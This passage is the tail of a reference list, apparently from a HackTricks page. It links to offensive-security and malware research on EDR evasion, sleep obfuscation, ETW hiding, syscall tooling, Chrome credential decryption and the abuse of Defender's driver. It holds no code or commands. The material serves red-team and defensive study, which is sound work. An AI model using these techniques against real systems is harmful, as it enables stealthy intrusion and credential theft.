- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader：API Tracing による Node.js Malware の defeat](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty：Crystal Palace で Adaptix を眠らせる](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II：CFG、CET、Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet Etw を隠す](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operations における Chrome Remote Desktop の悪用：実践ガイド](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged：Defender の Remediation Driver を kernel operation primitive として weaponize する](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo：LLVM を使用した self-masking functions の作成](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
